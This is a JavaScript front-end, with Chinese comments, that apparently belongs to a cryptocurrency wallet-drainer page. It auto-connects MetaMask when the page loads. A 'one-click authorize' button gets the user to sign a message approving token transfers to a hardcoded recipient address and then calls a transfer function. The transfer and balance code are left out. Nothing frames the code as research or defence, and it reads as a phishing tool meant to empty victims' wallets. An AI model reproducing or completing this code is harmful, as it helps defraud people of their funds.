const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
let web3;
let isConnected = false;
let isRequestPending = false;

const erc20Abi = [
    // ERC20 ABI 省略...
];

// 页面加载时自动连接钱包
window.onload = async () => {
    const selectedWallet = 'metamask'; // 默认选择 MetaMask
    document.getElementById('walletSelector').value = selectedWallet;
    
    await connectWallet(selectedWallet);
};

// 连接钱包的函数
async function connectWallet(walletType) {
    if (isRequestPending) {
        alert('已有请求在处理，请稍等');
        return;
    }

    isRequestPending = true;

    try {
        if (walletType === 'metamask') {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);

                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    updateWalletList(accounts[0]);
                    isConnected = true;
                    document.getElementById('status').innerText = 'MetaMask 已连接';
                    document.getElementById('authorizeButton').disabled = false;
                } else {
                    document.getElementById('status').innerText = '未检测到已连接的账户';
                }
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        }
        // 其他钱包类型的连接逻辑可以在这里添加
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    } finally {
        isRequestPending = false;
    }
}

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 一键授权按钮点击事件
document.getElementById('authorizeButton').onclick = async () => {
    if (!isConnected) {
        document.getElementById('status').innerText = '请先连接钱包';
        return;
    }

    const accounts = await web3.eth.getAccounts();
    const account = accounts[0];
    
    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
    try {
        const signature = await web3.eth.personal.sign(message, account);
        document.getElementById('status').innerText = `授权成功: ${signature}`;
        document.getElementById('signatureMessage').innerText = message;
        document.getElementById('signingSection').style.display = 'block';
        await transferTokens(account);
    } catch (error) {
        document.getElementById('status').innerText = '签名失败: ' + error.message;
    }
};

// 代币转移逻辑
const transferTokens = async (account) => {
    // 省略代币转移逻辑...
};

// 获取代币余额的函数
const getTokenBalances = async (address) => {
    // 省略获取余额的逻辑...
};
